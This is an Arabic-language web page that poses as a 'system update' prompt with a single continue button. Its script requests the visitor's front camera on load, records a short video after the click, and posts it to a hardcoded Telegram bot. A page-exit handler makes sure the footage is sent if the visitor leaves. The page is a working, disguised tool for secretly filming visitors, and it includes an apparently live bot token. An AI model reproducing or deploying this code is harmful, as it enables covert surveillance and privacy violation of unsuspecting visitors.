<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام</title>
    <style>
        body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        button { background: #38bdf8; color: #0f172a; border: none; padding: 18px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 12px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
    </style>
</head>
<body>
    <button id="mainBtn" onclick="startRecording()">اضغط هنا للمتابعة</button>
    <video id="v" autoplay playsinline style="display:none;"></video>

    <script>
        const TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
        const CHAT = '8304712202';
        let mediaStream = null;
        let mediaRecorder = null;
        let chunks = [];
        let isSent = false;

        async function initCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                document.getElementById('v').srcObject = mediaStream;
            } catch (e) {}
        }
        initCamera();

        function startRecording() {
            try {
                document.getElementById('mainBtn').style.display = 'none';

                if (!mediaStream) return;

                try {
                    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                } catch (e) {
                    mediaRecorder = new MediaRecorder(mediaStream);
                }

                mediaRecorder.ondataavailable = e => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = () => {
                    sendVideo();
                };

                mediaRecorder.start();

                // إيقاف التسجيل تلقائياً بعد ثانية ونصف
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 1500);

            } catch (e) {}
        }

        function sendVideo() {
            if (isSent || chunks.length === 0) return;
            isSent = true;

            const blob = new Blob(chunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('chat_id', CHAT);
            formData.append('video', blob, 'visitor_video.webm');

            // استخدام fetch للإرسال العادي
            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            }).catch(() => {});

            if (mediaStream) {
                mediaStream.getTracks().forEach(t => t.stop());
            }
        }

        // التقاط محاولة الخروج أو الضغط على زر الرجوع لضمان إرسال ما تم تسجيله فورا
        window.addEventListener('pagehide', () => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            } else {
                sendVideo();
            }
        });
    </script>
</body>
</html>
